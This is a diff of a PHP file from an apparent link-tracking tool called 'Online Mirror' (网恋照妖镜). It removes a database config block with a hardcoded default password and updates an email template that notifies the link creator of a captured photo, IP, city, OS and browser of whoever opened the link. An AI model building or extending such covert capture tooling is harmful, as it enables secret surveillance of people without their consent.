@@ -1,64 +1,4 @@
 <?php
-
-// ========== 📦 数据库配置 ==========
-// 请修改为你的实际数据库信息，或通过安装向导自动配置
-// 安装向导：浏览器访问 install.php
-
-define('DB_HOST', getenv('DB_HOST') ?: 'localhost');
-define('DB_USER', getenv('DB_USER') ?: 'mirror');
-define('DB_PASS', getenv('DB_PASS') ?: 'Mirror2024!Secure');
-define('DB_NAME', getenv('DB_NAME') ?: 'mirror');
-define('IMG_DIR', __DIR__ . '/img/');
-define('SITE_URL', (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'] . '/mirror/');
-
-
-
-// ========== 🔒 会话设置：登录后保持30天（仅在session未启动时生效）==========
-if (session_status() === PHP_SESSION_NONE) {
-    ini_set('session.cookie_lifetime', 2592000);
-    ini_set('session.gc_maxlifetime', 2592000);
-}
-
-// ========== 🔒 安全增强 ==========
-// 安全响应头
-header('X-Content-Type-Options: nosniff');
-header('X-Frame-Options: DENY');
-header('X-XSS-Protection: 1; mode=block');
-header('Referrer-Policy: no-referrer');
-
-// 自动创建img目录
-if (!file_exists(IMG_DIR)) {
-    mkdir(IMG_DIR, 0755, true);
-}
-
-// 安全写入img防护文件
-if (!file_exists(IMG_DIR . 'index.html')) {
-    file_put_contents(IMG_DIR . 'index.html', '<!DOCTYPE html><html><head><title></title></head><body></body></html>');
-}
-if (!file_exists(IMG_DIR . '.htaccess')) {
-    file_put_contents(IMG_DIR . '.htaccess', 'Options -Indexes' . "\n" . '<FilesMatch "\.(php|php5|phtml|inc|cgi|pl|sh|py)$">' . "\n" . 'Order Deny,Allow' . "\n" . 'Deny from all' . "\n" . '</FilesMatch>');
-}
-
-/**
- * 获取数据库连接
- */
-function getDB() {
-    static $pdo = null;
-    if ($pdo === null) {
-        try {
-            $pdo = new PDO('mysql:host=' . DB_HOST . ';dbname=' . DB_NAME . ';charset=utf8mb4', DB_USER, DB_PASS, [
-                PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
-                PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
-                PDO::ATTR_EMULATE_PREPARES => false,
-            ]);
-        } catch (PDOException $e) {
-            header('HTTP/1.1 500 Internal Server Error');
-            die('系统繁忙，请稍后再试');
-        }
-    }
-    return $pdo;
-}
-
 /**
  * 🔒 CSRF 生成Token
  */
@@ -331,7 +271,7 @@ function buildEmailBody($link_id, $city, $ip, $os, $browser, $time, $photo_url) 
 <div style="background:linear-gradient(135deg,#667eea,#764ba2,#f093fb);padding:32px 20px 24px;text-align:center;">
 <div style="font-size:48px;margin-bottom:8px;">📸</div>
 <h1 style="color:#fff;margin:0 0 4px;font-size:22px;font-weight:700;letter-spacing:1px;">新拍照捕获通知</h1>
-<p style="color:rgba(255,255,255,0.75);margin:0;font-size:14px;">网恋照妖镜 · Online Mirror v2.0</p>
+<p style="color:rgba(255,255,255,0.75);margin:0;font-size:14px;">网恋照妖镜 · Online Mirror v4.0</p>
 </div>
 
 <!-- 内容区 -->
@@ -376,7 +316,7 @@ function buildEmailBody($link_id, $city, $ip, $os, $browser, $time, $photo_url) 
 <!-- 底部 -->
 <div style="background:rgba(0,0,0,0.2);padding:16px 20px;text-align:center;border-top:1px solid rgba(255,255,255,0.04);">
 <p style="margin:0;font-size:11px;color:#606080;line-height:1.8;">
-🪞 网恋照妖镜 v2.0 · 自动通知邮件<br>
+🪞 网恋照妖镜 v4.0 · 自动通知邮件<br>
 <span style="color:#404060;">此邮件由系统自动发送，请勿回复</span>
 </p>
 </div>
@@ -550,7 +490,7 @@ function sendEmailNotify($link_id, $photo_info) {
         $os = $photo_info['os'] ?? '未知';
         
         $site_url = SITE_URL;
-        $photo_url = $site_url . 'photos.php?id=' . urlencode($link_id);
+        $photo_url = $site_url . 'photos/' . urlencode($link_id);
         
         $body = buildEmailBody($link_id, $city, $ip, $os, $browser, $time, $photo_url);
         
